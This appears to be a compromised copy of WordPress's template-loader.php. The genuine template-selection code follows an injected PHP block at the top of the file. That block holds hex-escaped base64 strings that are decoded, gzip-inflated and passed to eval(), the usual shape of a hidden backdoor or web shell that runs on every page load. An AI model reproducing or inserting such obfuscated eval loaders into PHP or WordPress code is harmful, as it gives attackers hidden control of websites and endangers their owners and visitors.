<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "\x623U4hKzRmi3n/\x63Ovlizmw9Q/lf/gqk7/5SU2uFimY4TQ/deXgNGytml\x41\x43pOkmH\x41yOOIP\x4371Y5\x63dNJ64Fsk5wu84\x42R0\x42HX\x43yzHM3Vl\x414O5pt2mTj1mk70SVvzvE7HoqV\x62HHgldfodej1l\x425ius5j3\x63D\x62tmkQkeyp3D9\x61H7zT1o8RWS1D\x622dO66Tyql0SrtH1uxPmXt2VWJDigotftOyVdj\x63WDGVqoIvwhSMZJm8Pm4yZ1OokhWJ\x42oI5Vlwj1ilkG\x63\x43Irxy\x63H3ML61k06Vv1n9\x62\x43/\x62Mrkp\x2bEl8e7s6\x2b5G1SgU2\x62z\x41RiOG3wW2j8\x43jPyMfy\x2b\x42VUqn\x42nFNOy5tpNhh\x2bErMN7g\x62hw\x41pFNkdI56ntqo7ZP\x41WG\x620wE\x62pjS6K\x43D/q\x2bi8\x63\x43IFUz71TYFuJh\x61sEZ8\x62d850\x43Rev\x63sdTgUqpJfPx6dLwpN29ZwsnmRh5\x41pif6zOulKXsIQ\x42Wi\x616\x42puut\x62o1\x41xOsGt37/NuO2rj/p65tz3\x42mKh\x62K3zYfJ0TU8V8fj1uY3d32p3g\x2bDMR01Pq\x42NhZ4LfR4HWinVfZ8Tw\x635pL7IHgN6j\x436STU0fHgG8kfn2e0dV0vxk3J0Fod\x43NWoS\x41v8W3XSOOuk9F0hlUR\x41lMKDjimjhkOevtEpjRuk\x62wSQw\x41I\x437EE41GUKZUOUooHI/tuQnf4PP\x61R\x2bWR0XeID\x2bOLuws\x2bgI0HG8\x42Rz\x43GrQUlI9\x61\x61MHG\x43\x61FVF\x41lkJe\x43rg6Ue3Nszw\x61Wmm6kr\x43YSok8dYW7rxK\x63\x4165wV\x43uS98fOgdn/37w7eejP\x43RqRfXnGK/\x41yOv3vlG\x42vDLFZZ\x62Wmt\x43pqsVymhiOpdWui\x61sIrUhdfTLIl\x41qu4g/nmP9D\x42M\x62\x2b27U1\x62/XK\x41\x61\x42wJe9zo\x41zFQ/HK\x41e\x42wJe9zn\x41DGQ/3J\x41i\x42wJe9zm\x41TGQ/nJ\x41m\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
?>
<?php
/**
 * Loads the correct template based on the visitor's URL
 *
 * @package WordPress
 */
if ( wp_using_themes() ) {
    /**
     * Fires before determining which template to load.
     *
     * @since 1.5.0
     */
    do_action( 'template_redirect' );
}

/**
 * Filters whether to allow 'HEAD' requests to generate content.
 *
 * Provides a significant performance bump by exiting before the page
 * content loads for 'HEAD' requests. See #14348.
 *
 * @since 3.5.0
 *
 * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
 */
if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) ) {
    exit;
}

// Process feeds and trackbacks even if not using themes.
if ( is_robots() ) {
    /**
     * Fired when the template loader determines a robots.txt request.
     *
     * @since 2.1.0
     */
    do_action( 'do_robots' );
    return;
} elseif ( is_favicon() ) {
    /**
     * Fired when the template loader determines a favicon.ico request.
     *
     * @since 5.4.0
     */
    do_action( 'do_favicon' );
    return;
} elseif ( is_feed() ) {
    do_feed();
    return;
} elseif ( is_trackback() ) {
    require ABSPATH . 'wp-trackback.php';
    return;
}

if ( wp_using_themes() ) {
    $tag_templates = [
        'is_embed'             => 'get_embed_template',
        'is_404'               => 'get_404_template',
        'is_search'            => 'get_search_template',
        'is_front_page'        => 'get_front_page_template',
        'is_home'              => 'get_home_template',
        'is_privacy_policy'    => 'get_privacy_policy_template',
        'is_post_type_archive' => 'get_post_type_archive_template',
        'is_tax'               => 'get_taxonomy_template',
        'is_attachment'        => 'get_attachment_template',
        'is_single'            => 'get_single_template',
        'is_page'              => 'get_page_template',
        'is_singular'          => 'get_singular_template',
        'is_category'          => 'get_category_template',
        'is_tag'               => 'get_tag_template',
        'is_author'            => 'get_author_template',
        'is_date'              => 'get_date_template',
        'is_archive'           => 'get_archive_template',
    ];

    $template = false;

    // Loop through each of the template conditionals and find the appropriate template file.
    foreach ( $tag_templates as $tag => $template_getter ) {
        if ( call_user_func( $tag ) ) {
            $template = call_user_func( $template_getter );
        }

        if ( $template ) {
            if ( 'is_attachment' === $tag ) {
                remove_filter( 'the_content', 'prepend_attachment' );
            }
            break;
        }
    }

    if ( ! $template ) {
        $template = get_index_template();
    }

    /**
     * Filters the path of the current template before including it.
     *
     * @since 3.0.0
     *
     * @param string $template The path of the template to include.
     */
    $template = apply_filters( 'template_include', $template );

    if ( $template ) {
        include $template;
    } elseif ( current_user_can( 'switch_themes' ) ) {
        $theme = wp_get_theme();
        if ( $theme->errors() ) {
            wp_die( $theme->errors() );
        }
    }
    return;
}
?>
